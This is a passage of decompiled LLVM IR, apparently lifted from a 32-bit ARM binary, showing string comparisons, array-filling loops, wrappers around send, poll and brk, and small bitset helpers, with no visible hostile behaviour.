  %v6_13110 = icmp slt i32 %v1_13110, 0
  %v7_13110 = icmp eq i32 %storemerge, 4
  %v3_13114 = xor i1 %v6_13110, %v5_13110
  %v4_13114 = or i1 %v7_13110, %v3_13114
  br i1 %v4_13114, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_13120

bb58:                                             ; preds = %bb57
  %v2_13118 = icmp eq i32 %v0_13118.pr, 0
  br i1 %v2_13118, label %dec_label_pc_13120, label %dec_label_pc_13090

dec_label_pc_13120:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_17c44.581 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_1312c = call i32 @function_137d0(i8* %v3_1312c, i32 ptrtoint ([11 x i8]* @global_var_17c44.581 to i32))
  store i32 %v4_1312c, i32* %r0.global-to-local, align 4
  %v2_13130 = icmp eq i32 %v4_1312c, 0
  br i1 %v2_13130, label %dec_label_pc_13158.preheader, label %dec_label_pc_1317c

dec_label_pc_13158.preheader:                     ; preds = %dec_label_pc_13120
  br label %dec_label_pc_13158

dec_label_pc_13140:                               ; preds = %dec_label_pc_13170
  %v1_13140 = add i32 %v5_13160, -36
  %v2_13140 = inttoptr i32 %v1_13140 to i32*
  %v3_13140 = load i32, i32* %v2_13140, align 4
  store i32 %v3_13140, i32* %r0.global-to-local, align 4
  %v1_13144 = call i32 @function_f170(i32 %v3_13140)
  store i32 %v1_13144, i32* %r0.global-to-local, align 4
  %v0_1314c = load i32, i32* @r4, align 4
  %v1_1314c = add i32 %v0_1314c, 1
  store i32 %v1_1314c, i32* %r2.global-to-local, align 4
  %v5_13150 = mul i32 %v0_1314c, 4
  %v6_13150 = add i32 %v5_13150, ptrtoint (i32* @global_var_1ad38.421 to i32)
  %v7_13150 = inttoptr i32 %v6_13150 to i32*
  store i32 %v1_13144, i32* %v7_13150, align 4
  %v0_13154 = load i32, i32* %r2.global-to-local, align 4
  %v1_13154 = load i32, i32* @r7, align 4
  %v2_13154 = inttoptr i32 %v1_13154 to i32*
  store i32 %v0_13154, i32* %v2_13154, align 4
  %v0_1315c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13158

dec_label_pc_13158:                               ; preds = %dec_label_pc_13158.preheader, %dec_label_pc_13140
  %v0_13168 = phi i32 [ 1, %dec_label_pc_13158.preheader ], [ %v0_1315c.pre, %dec_label_pc_13140 ]
  store i32 %v2_13090, i32* %r2.global-to-local, align 4
  %v1_1315c = load i32, i32* @r8, align 4
  %v2_1315c = sub i32 %v0_13168, %v1_1315c
  %v4_1315c = xor i32 %v1_1315c, %v0_13168
  %v5_1315c = xor i32 %v2_1315c, %v0_13168
  %v6_1315c = and i32 %v5_1315c, %v4_1315c
  %v7_1315c = icmp slt i32 %v6_1315c, 0
  %v8_1315c = icmp slt i32 %v2_1315c, 0
  %v4_13160 = mul i32 %v0_13168, 4
  %v5_13160 = add i32 %v4_13160, %v2_13090
  store i32 ptrtoint (i32* @global_var_1ad44.418 to i32), i32* @r7, align 4
  %v1_13168 = add i32 %v0_13168, 1
  store i32 %v1_13168, i32* @r5, align 4
  %v2_1316c = xor i1 %v8_1315c, %v7_1315c
  br i1 %v2_1316c, label %dec_label_pc_13170, label %dec_label_pc_1317c

dec_label_pc_13170:                               ; preds = %dec_label_pc_13158
  %v2_13170 = load i32, i32* @global_var_1ad44.418, align 4
  store i32 %v2_13170, i32* @r4, align 4
  %v7_13178 = icmp slt i32 %v2_13170, 3
  br i1 %v7_13178, label %dec_label_pc_13140, label %dec_label_pc_1317c

dec_label_pc_1317c:                               ; preds = %dec_label_pc_13158, %dec_label_pc_13170, %dec_label_pc_13120
  %v0_1317c = load i32, i32* @r6, align 4
  store i32 %v0_1317c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_17c50.584 to i32), i32* @r1, align 4
  %v3_13184 = inttoptr i32 %v0_1317c to i8*
  %v4_13184 = call i32 @function_137d0(i8* %v3_13184, i32 ptrtoint ([7 x i8]* @global_var_17c50.584 to i32))
  store i32 %v4_13184, i32* %r0.global-to-local, align 4
  %v2_13188 = icmp eq i32 %v4_13184, 0
  br i1 %v2_13188, label %dec_label_pc_131c0.preheader, label %dec_label_pc_13190

dec_label_pc_13190:                               ; preds = %dec_label_pc_1317c
  %v0_13190 = load i32, i32* @r6, align 4
  store i32 %v0_13190, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_17c58.586 to i32), i32* @r1, align 4
  %v3_13198 = inttoptr i32 %v0_13190 to i8*
  %v4_13198 = call i32 @function_137d0(i8* %v3_13198, i32 ptrtoint ([7 x i8]* @global_var_17c58.586 to i32))
  store i32 %v4_13198, i32* %r0.global-to-local, align 4
  %v2_1319c = icmp eq i32 %v4_13198, 0
  br i1 %v2_1319c, label %dec_label_pc_131c0.preheader, label %dec_label_pc_1321c.backedge

dec_label_pc_131c0.preheader:                     ; preds = %dec_label_pc_1317c, %dec_label_pc_13190
  store i32 ptrtoint (i32* @global_var_1ad48.561 to i32), i32* @r4, align 4
  %v2_131c460 = load i32, i32* @global_var_1ad48.561, align 4
  store i32 ptrtoint (i32* @global_var_1ad28.565 to i32), i32* @r5, align 4
  %v1_131d063 = add i32 %v2_131c460, -1
  store i32 %v1_131d063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_131c460, 1
  br i1 %tmp5964, label %dec_label_pc_131d8, label %dec_label_pc_131a8

dec_label_pc_131a8:                               ; preds = %dec_label_pc_131c0.preheader, %dec_label_pc_131a8
  %v1_131d065 = phi i32 [ %v1_131d0, %dec_label_pc_131a8 ], [ %v1_131d063, %dec_label_pc_131c0.preheader ]
  %v4_131a8 = mul i32 %v1_131d065, 4
  %v5_131a8 = add i32 %v4_131a8, ptrtoint (i32* @global_var_1ad28.565 to i32)
  %v6_131a8 = inttoptr i32 %v5_131a8 to i32*
  %v7_131a8 = load i32, i32* %v6_131a8, align 4
  store i32 %v7_131a8, i32* %r0.global-to-local, align 4
  store i32 %v1_131d065, i32* @global_var_1ad48.561, align 4
  %v1_131b0 = call i32 @function_fa5c(i32 %v7_131a8)
  store i32 %v1_131b0, i32* %r0.global-to-local, align 4
  %v0_131b4 = load i32, i32* @r4, align 4
  %v1_131b4 = inttoptr i32 %v0_131b4 to i32*
  %v2_131b4 = load i32, i32* %v1_131b4, align 4
  %v1_131bc = load i32, i32* @r5, align 4
  %v5_131bc = mul i32 %v2_131b4, 4
  %v6_131bc = add i32 %v1_131bc, %v5_131bc
  %v7_131bc = inttoptr i32 %v6_131bc to i32*
  store i32 0, i32* %v7_131bc, align 4
  store i32 ptrtoint (i32* @global_var_1ad48.561 to i32), i32* @r4, align 4
  %v2_131c4 = load i32, i32* @global_var_1ad48.561, align 4
  store i32 ptrtoint (i32* @global_var_1ad28.565 to i32), i32* @r5, align 4
  %v1_131d0 = add i32 %v2_131c4, -1
  store i32 %v1_131d0, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_131c4, 1
  br i1 %tmp59, label %dec_label_pc_131d8, label %dec_label_pc_131a8

dec_label_pc_131d8:                               ; preds = %dec_label_pc_131a8, %dec_label_pc_131c0.preheader
  br label %dec_label_pc_131f8

dec_label_pc_131e0:                               ; preds = %dec_label_pc_13210
  %v1_131e0 = add i32 %v5_13200, -36
  %v2_131e0 = inttoptr i32 %v1_131e0 to i32*
  %v3_131e0 = load i32, i32* %v2_131e0, align 4
  store i32 %v3_131e0, i32* %r0.global-to-local, align 4
  %v1_131e4 = call i32 @function_f170(i32 %v3_131e0)
  store i32 %v1_131e4, i32* %r0.global-to-local, align 4
  %v0_131ec = load i32, i32* @r4, align 4
  %v1_131ec = add i32 %v0_131ec, 1
  store i32 %v1_131ec, i32* %r2.global-to-local, align 4
  %v5_131f0 = mul i32 %v0_131ec, 4
  %v6_131f0 = add i32 %v5_131f0, ptrtoint (i32* @global_var_1ad28.565 to i32)
  %v7_131f0 = inttoptr i32 %v6_131f0 to i32*
  store i32 %v1_131e4, i32* %v7_131f0, align 4
  %v0_131f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_131f4 = load i32, i32* @r6, align 4
  %v2_131f4 = inttoptr i32 %v1_131f4 to i32*
  store i32 %v0_131f4, i32* %v2_131f4, align 4
  %v0_131fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_131f8

dec_label_pc_131f8:                               ; preds = %dec_label_pc_131d8, %dec_label_pc_131e0
  %v0_13208 = phi i32 [ 1, %dec_label_pc_131d8 ], [ %v0_131fc.pre, %dec_label_pc_131e0 ]
  store i32 %v2_13090, i32* %r2.global-to-local, align 4
  %v1_131fc = load i32, i32* @r8, align 4
  %v2_131fc = sub i32 %v0_13208, %v1_131fc
  %v4_131fc = xor i32 %v1_131fc, %v0_13208
  %v5_131fc = xor i32 %v2_131fc, %v0_13208
  %v6_131fc = and i32 %v5_131fc, %v4_131fc
  %v7_131fc = icmp slt i32 %v6_131fc, 0
  %v8_131fc = icmp slt i32 %v2_131fc, 0
  %v4_13200 = mul i32 %v0_13208, 4
  %v5_13200 = add i32 %v4_13200, %v2_13090
  store i32 ptrtoint (i32* @global_var_1ad48.561 to i32), i32* @r6, align 4
  %v1_13208 = add i32 %v0_13208, 1
  store i32 %v1_13208, i32* @r5, align 4
  %v2_1320c = xor i1 %v8_131fc, %v7_131fc
  br i1 %v2_1320c, label %dec_label_pc_13210, label %dec_label_pc_1321c.backedge

dec_label_pc_13210:                               ; preds = %dec_label_pc_131f8
  %v2_13210 = load i32, i32* @global_var_1ad48.561, align 4
  store i32 %v2_13210, i32* @r4, align 4
  %v7_13218 = icmp slt i32 %v2_13210, 4
  br i1 %v7_13218, label %dec_label_pc_131e0, label %dec_label_pc_1321c.backedge

dec_label_pc_1304c.preheader:                     ; preds = %dec_label_pc_1304c.preheader.lr.ph, %dec_label_pc_1321c.backedge
  store i32 %v2_12fe0, i32* %r0.global-to-local, align 4
  %v2_1304c12 = load i8, i8* %v1_1304c11, align 4
  %v3_1304c13 = zext i8 %v2_1304c12 to i32
  store i32 %v3_1304c13, i32* %r2.global-to-local, align 4
  %v2_1305014 = icmp eq i8 %v2_1304c12, 0
  br i1 %v2_1305014, label %dec_label_pc_1306c, label %dec_label_pc_13058.lr.ph

dec_label_pc_13058.lr.ph:                         ; preds = %dec_label_pc_1304c.preheader
  %v2_1305c.pre = load i32, i32* @global_var_18428, align 4
  br label %dec_label_pc_13058

dec_label_pc_1323c:                               ; preds = %dec_label_pc_1321c.backedge, %dec_label_pc_1321c.preheader
  %v0_1323c = load i32, i32* @sl, align 4
  store i32 %v0_1323c, i32* %r0.global-to-local, align 4
  %v1_13240 = inttoptr i32 %v0_1323c to i8*
  %v2_13240 = call i32 @function_cc14(i8* %v1_13240)
  store i32 %v2_13240, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13254

dec_label_pc_13248:                               ; preds = %dec_label_pc_13030
  %v0_13248 = call i32 @function_11004()
  store i32 %v0_13248, i32* %r0.global-to-local, align 4
  %v2_13250 = inttoptr i32 %v0_13248 to i32*
  store i32 3, i32* %v2_13250, align 4
  br label %dec_label_pc_13254

dec_label_pc_13254:                               ; preds = %dec_label_pc_12fdc, %dec_label_pc_1323c, %dec_label_pc_13248
  store i32 %v2_12fe4, i32* @r0, align 4
  %v1_13264 = call i32 @function_10840()
  store i32 %v1_13264, i32* %r0.global-to-local, align 4
  store i32 %v6_12fdc, i32* @r5, align 4
  store i32 %v9_12fdc, i32* @r6, align 4
  store i32 %v12_12fdc, i32* @r7, align 4
  store i32 %v15_12fdc, i32* @r8, align 4
  store i32 %v18_12fdc, i32* @sl, align 4
  ret i32 %v1_13264

; uselistorder directives
  uselistorder i32 %v3_1304c13, { 2, 1, 0 }
  uselistorder i32 %v2_131fc, { 1, 0 }
  uselistorder i32 %v0_13208, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_131d0, { 1, 0 }
  uselistorder i32 %v1_131d065, { 1, 0 }
  uselistorder i32 %v2_1315c, { 1, 0 }
  uselistorder i32 %v0_13168, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_13098, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_130d820, { 1, 0, 2 }
  uselistorder i32 %v2_13090, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_12fe0, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 13, 0, 16, 17, 1, 12, 4, 2, 3, 5, 15, 6, 14, 7, 9, 8, 11, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 29, 28, 18, 4, 3, 6, 5, 8, 7, 10, 9, 27, 11, 26, 12, 13, 16, 14, 17, 20, 19, 15, 24, 25, 21, 23, 1, 22 }
  uselistorder i32 ()* @function_11004, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32 (i32)* @function_fa5c, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 16, 15, 2, 18, 17, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1ad28.565 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_1ad48.561, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_1ad48.561 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1ad38.421 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 13, 12, 14, 11 }
  uselistorder i32* @global_var_1ad44.418, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_13254, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1304c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_131f8, { 1, 0 }
  uselistorder label %dec_label_pc_131a8, { 1, 0 }
  uselistorder label %dec_label_pc_131c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1317c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13158, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_13104, { 1, 0 }
  uselistorder label %dec_label_pc_13100, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130e4, { 1, 0 }
  uselistorder label %dec_label_pc_130d0, { 1, 0 }
  uselistorder label %dec_label_pc_130b0, { 1, 0 }
  uselistorder label %dec_label_pc_1321c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_1306c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1321c.preheader, { 1, 0 }
}

define i32 @function_132b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_132b0:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_132ec = call i32 @function_14380()
  ret i32 %v0_132ec
}

define i32 @function_132f8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_132f8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_132f8 = load i32, i32* @r4, align 4
  store i32 %v3_132f8, i32* %stack_var_-8, align 4
  %v5_132fc = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_132fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_132fc, -4095
  br i1 %tmp, label %dec_label_pc_1331c, label %dec_label_pc_1330c

dec_label_pc_1330c:                               ; preds = %dec_label_pc_132f8
  %v0_1330c = call i32 @function_cc08()
  %v0_13310 = load i32, i32* %r4.global-to-local, align 4
  %v1_13310 = sub i32 0, %v0_13310
  %v2_13314 = inttoptr i32 %v0_1330c to i32*
  store i32 %v1_13310, i32* %v2_13314, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1331c

dec_label_pc_1331c:                               ; preds = %dec_label_pc_132f8, %dec_label_pc_1330c
  %v0_1331c = phi i32 [ %v5_132fc, %dec_label_pc_132f8 ], [ -1, %dec_label_pc_1330c ]
  %v2_13320 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13320, i32* %r4.global-to-local, align 4
  ret i32 %v0_1331c

; uselistorder directives
  uselistorder i32 %v5_132fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1331c, { 1, 0 }
}

define i32 @function_13324(i32 %arg1) local_unnamed_addr {
dec_label_pc_13324:
  %v3_13324 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1332c = call i32 @function_ca70()
  %v0_13330 = load i32, i32* @r4, align 4
  store i32 %v3_13324, i32* @r4, align 4
  %v2_13338 = call i32 @function_cb18(i32 %v0_1332c, i32 %v0_13330)
  ret i32 %v2_13338

; uselistorder directives
  uselistorder i32 ()* @function_ca70, { 0, 2, 1 }
}

define i32 @function_1333c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1333c:
  %v1_1333c = add i32 %arg2, -1
  %v3_13340 = udiv i32 %v1_1333c, 32
  %v4_13344 = mul nuw nsw i32 %v3_13340, 4
  %v5_13344 = add i32 %v4_13344, %arg1
  %v6_13344 = inttoptr i32 %v5_13344 to i32*
  %v7_13344 = load i32, i32* %v6_13344, align 4
  %v1_13348 = urem i32 %v1_1333c, 32
  %v7_13350 = shl i32 1, %v1_13348
  %v8_13350 = and i32 %v7_13344, %v7_13350
  %v10_13350 = icmp ne i32 %v8_13350, 0
  %. = zext i1 %v10_13350 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_1333c, { 1, 0 }
}

define i32 @function_13360(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13360:
  %v1_13360 = add i32 %arg2, -1
  %v3_13364 = udiv i32 %v1_13360, 32
  %v4_13368 = mul nuw nsw i32 %v3_13364, 4
  %v5_13368 = add i32 %v4_13368, %arg1
  %v6_13368 = inttoptr i32 %v5_13368 to i32*
  %v7_13368 = load i32, i32* %v6_13368, align 4
  %v1_1336c = urem i32 %v1_13360, 32
  %v7_13374 = shl i32 1, %v1_1336c
  %v8_13374 = or i32 %v7_13368, %v7_13374
  store i32 %v8_13374, i32* %v6_13368, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13360, { 1, 0 }
}

define i32 @function_13384(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13384:
  %v1_13384 = add i32 %arg2, -1
  %v3_13388 = udiv i32 %v1_13384, 32
  %v4_1338c = mul nuw nsw i32 %v3_13388, 4
  %v5_1338c = add i32 %v4_1338c, %arg1
  %v6_1338c = inttoptr i32 %v5_1338c to i32*
  %v7_1338c = load i32, i32* %v6_1338c, align 4
  %v1_13390 = urem i32 %v1_13384, 32
  %tmp = shl i32 -1, %v1_13390
  %v8_13398 = add i32 %tmp, -1
  %v9_13398 = and i32 %v7_1338c, %v8_13398
  store i32 %v9_13398, i32* %v6_1338c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13384, { 1, 0 }
}

define i32 @function_133a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_133a8:
  %v1_133a8 = add i32 %arg1, 28
  %v2_133a8 = inttoptr i32 %v1_133a8 to i32*
  %v3_133a8 = load i32, i32* %v2_133a8, align 4
  %v1_133b0 = add i32 %arg1, 44
  %v2_133b0 = inttoptr i32 %v1_133b0 to i32*
  %v3_133b0 = load i32, i32* %v2_133b0, align 4
  store i32 %v3_133a8, i32* @global_var_1ad4c.591, align 4
  store i32 %v3_133b0, i32* @global_var_1ad50.593, align 4
  ret i32 %arg1
}

define i32 @function_133cc(i32* %arg1) local_unnamed_addr {
dec_label_pc_133cc:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_133d4 = call i32 @brk(i32* %arg1)
  %v3_133d8 = icmp ult i32 %v2_133d4, %tmp
  store i32 %v2_133d4, i32* @global_var_1aaec.522, align 4
  br i1 %v3_133d8, label %dec_label_pc_133ec, label %dec_label_pc_133fc

dec_label_pc_133ec:                               ; preds = %dec_label_pc_133cc
  %v0_133ec = call i32 @function_cc08()
  %v2_133f4 = inttoptr i32 %v0_133ec to i32*
  store i32 12, i32* %v2_133f4, align 4
  br label %dec_label_pc_133fc

dec_label_pc_133fc:                               ; preds = %dec_label_pc_133cc, %dec_label_pc_133ec
  %v0_133fc = phi i32 [ 0, %dec_label_pc_133cc ], [ -1, %dec_label_pc_133ec ]
  ret i32 %v0_133fc

; uselistorder directives
  uselistorder i32* @global_var_1aaec.522, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_133fc, { 1, 0 }
}

define i32 @function_13408() local_unnamed_addr {
dec_label_pc_13408:
  %stack_var_-8 = alloca i32, align 4
  %v3_13408 = load i32, i32* @r4, align 4
  store i32 %v3_13408, i32* %stack_var_-8, align 4
  %v0_1340c = load i32, i32* @r0, align 4
  %v0_13410 = call i32 @function_cc08()
  %v1_13414 = sub i32 0, %v0_1340c
  %v2_13418 = inttoptr i32 %v0_13410 to i32*
  store i32 %v1_13414, i32* %v2_13418, align 4
  %v2_13420 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13420, i32* @r4, align 4
  ret i32 -1
}

define i32 @function_13424(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13424:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13424 = load i32, i32* @r4, align 4
  store i32 %v3_13424, i32* %stack_var_-8, align 4
  %v5_13428 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_13428, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13428, -4095
  br i1 %tmp, label %dec_label_pc_13448, label %dec_label_pc_13438

dec_label_pc_13438:                               ; preds = %dec_label_pc_13424
  %v0_13438 = call i32 @function_cc08()
  %v0_1343c = load i32, i32* %r4.global-to-local, align 4
  %v1_1343c = sub i32 0, %v0_1343c
  %v2_13440 = inttoptr i32 %v0_13438 to i32*
  store i32 %v1_1343c, i32* %v2_13440, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13448

dec_label_pc_13448:                               ; preds = %dec_label_pc_13424, %dec_label_pc_13438
  %v0_13448 = phi i32 [ %v5_13428, %dec_label_pc_13424 ], [ -1, %dec_label_pc_13438 ]
  %v2_1344c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1344c, i32* @r4, align 4
  ret i32 %v0_13448

; uselistorder directives
  uselistorder i32 %v5_13428, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13448, { 1, 0 }
}

define i32 @function_13450() local_unnamed_addr {
dec_label_pc_13450:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_13450 = load i32, i32* @r2, align 4
  store i32 %v0_13450, i32* %r3.global-to-local, align 4
  %v0_13454 = load i32, i32* @r1, align 4
  %v3_13454 = ashr i32 %v0_13454, 31
  store i32 %v3_13454, i32* %r2.global-to-local, align 4
  %v3_1345c = load i32, i32* @r4, align 4
  %v6_1345c = load i32, i32* @r5, align 4
  %v9_1345c = load i32, i32* @r6, align 4
  %v2_13464 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_13450, i32* @r6, align 4
  %v0_1346c = load i32, i32* @r0, align 4
  store i32 %v0_1346c, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_13450, 3
  br i1 %tmp, label %dec_label_pc_13488, label %dec_label_pc_13474

dec_label_pc_13474:                               ; preds = %dec_label_pc_13450
  %v0_13474 = call i32 @function_cc08()
  store i32 %v0_13474, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_13480 = inttoptr i32 %v0_13474 to i32*
  store i32 22, i32* %v2_13480, align 4
  br label %.thread3

dec_label_pc_13488:                               ; preds = %dec_label_pc_13450
  %v1_13488 = add i32 %v0_1346c, 52
  %v2_13488 = inttoptr i32 %v1_13488 to i32*
  %v3_13488 = load i32, i32* %v2_13488, align 4
  store i32 %v3_13488, i32* %r7.global-to-local, align 4
  %v2_1348c = icmp eq i32 %v3_13488, 0
  store i32 %v0_13454, i32* %stack_var_-28, align 4
  br i1 %v2_1348c, label %dec_label_pc_1349c, label %dec_label_pc_134c8

dec_label_pc_1349c:                               ; preds = %dec_label_pc_13488
  %v1_1349c = add i32 %v0_1346c, 56
  store i32 %v1_1349c, i32* @r4, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  store i32 %v2_13464, i32* @r0, align 4
  store i32 %v1_1349c, i32* %r2.global-to-local, align 4
  %v1_134b4 = call i32 @function_10840()
  %v0_134b8 = load i32, i32* @r4, align 4
  store i32 %v0_134b8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  store i32 79048, i32* @lr, align 4
  %v1_134c4 = call i32 @function_10838()
  store i32 %v1_134c4, i32* %r0.global-to-local, align 4
  %v0_134c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_134c8

dec_label_pc_134c8:                               ; preds = %dec_label_pc_13488, %dec_label_pc_1349c
  %v0_134d4 = phi i32 [ %v0_1346c, %dec_label_pc_13488 ], [ %v0_134c8.pre, %dec_label_pc_1349c ]
  %v1_134c8 = inttoptr i32 %v0_134d4 to i8*
  %v2_134c8 = load i8, i8* %v1_134c8, align 1
  %v3_134c8 = zext i8 %v2_134c8 to i32
  store i32 %v3_134c8, i32* %r3.global-to-local, align 4
  %v1_134cc = and i32 %v3_134c8, 64
  %v2_134cc = icmp eq i32 %v1_134cc, 0
  br i1 %v2_134cc, label %dec_label_pc_134e4, label %dec_label_pc_134d4

dec_label_pc_134d4:                               ; preds = %dec_label_pc_134c8
  store i32 %v0_134d4, i32* @r0, align 4
  %v0_134d8 = call i32 @function_d60c()
  store i32 %v0_134d8, i32* %r0.global-to-local, align 4
  %v2_134dc = icmp eq i32 %v0_134d8, 0
  br i1 %v2_134dc, label %dec_label_pc_134e4, label %dec_label_pc_13554

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134d4, %dec_label_pc_134c8
  %v0_134e4 = load i32, i32* @r6, align 4
  %v7_134e4 = icmp eq i32 %v0_134e4, 1
  br i1 %v7_134e4, label %dec_label_pc_134ec, label %dec_label_pc_134e4.dec_label_pc_13500_crit_edge

dec_label_pc_134e4.dec_label_pc_13500_crit_edge:  ; preds = %dec_label_pc_134e4
  br label %dec_label_pc_13500

dec_label_pc_134ec:                               ; preds = %dec_label_pc_134e4
  %v0_134ec = load i32, i32* @r5, align 4
  store i32 %v0_134ec, i32* %r0.global-to-local, align 4
  %v2_134f0 = ptrtoint i32* %stack_var_-28 to i32
  %v2_134f4 = inttoptr i32 %v0_134ec to i8*
  %v3_134f4 = call i32 @function_135e8(i8* %v2_134f4, i32 %v2_134f0)
  store i32 %v3_134f4, i32* %r0.global-to-local, align 4
  %v1_134f8 = icmp slt i32 %v3_134f4, 0
  br i1 %v1_134f8, label %dec_label_pc_13554, label %dec_label_pc_134ec.dec_label_pc_13500_crit_edge

dec_label_pc_134ec.dec_label_pc_13500_crit_edge:  ; preds = %dec_label_pc_134ec
  %v0_13500.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13500

dec_label_pc_13500:                               ; preds = %dec_label_pc_134e4.dec_label_pc_13500_crit_edge, %dec_label_pc_134ec.dec_label_pc_13500_crit_edge
  %v0_13500 = phi i32 [ %v0_134e4, %dec_label_pc_134e4.dec_label_pc_13500_crit_edge ], [ %v0_13500.pre, %dec_label_pc_134ec.dec_label_pc_13500_crit_edge ]
  store i32 %v0_13500, i32* %r2.global-to-local, align 4
  %v0_13504 = load i32, i32* @r5, align 4
  store i32 %v0_13504, i32* %r0.global-to-local, align 4
  %v4_1350c = call i32 @function_1379c(i32 %v0_13504, i32* nonnull %stack_var_-28, i32 %v0_13500)
  store i32 %v4_1350c, i32* %r0.global-to-local, align 4
  %v1_13510 = icmp slt i32 %v4_1350c, 0
  br i1 %v1_13510, label %dec_label_pc_13554, label %dec_label_pc_13518

dec_label_pc_13518:                               ; preds = %dec_label_pc_13500
  %v0_13518 = load i32, i32* @r5, align 4
  %v1_13518 = inttoptr i32 %v0_13518 to i32*
  %v2_13518 = load i32, i32* %v1_13518, align 4
  store i32 %v2_13518, i32* %r3.global-to-local, align 4
  %v1_1351c = add i32 %v0_13518, 8
  %v2_1351c = inttoptr i32 %v1_1351c to i32*
  %v3_1351c = load i32, i32* %v2_1351c, align 4
  store i32 %v3_1351c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13524 = and i32 %v2_13518, -72
  store i32 %v1_13524, i32* %r3.global-to-local, align 4
  %v3_13528 = sdiv i32 %v2_13518, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_13530 = trunc i32 %v3_13528 to i8
  %v3_13530 = add i32 %v0_13518, 1
  %v4_13530 = inttoptr i32 %v3_13530 to i8*
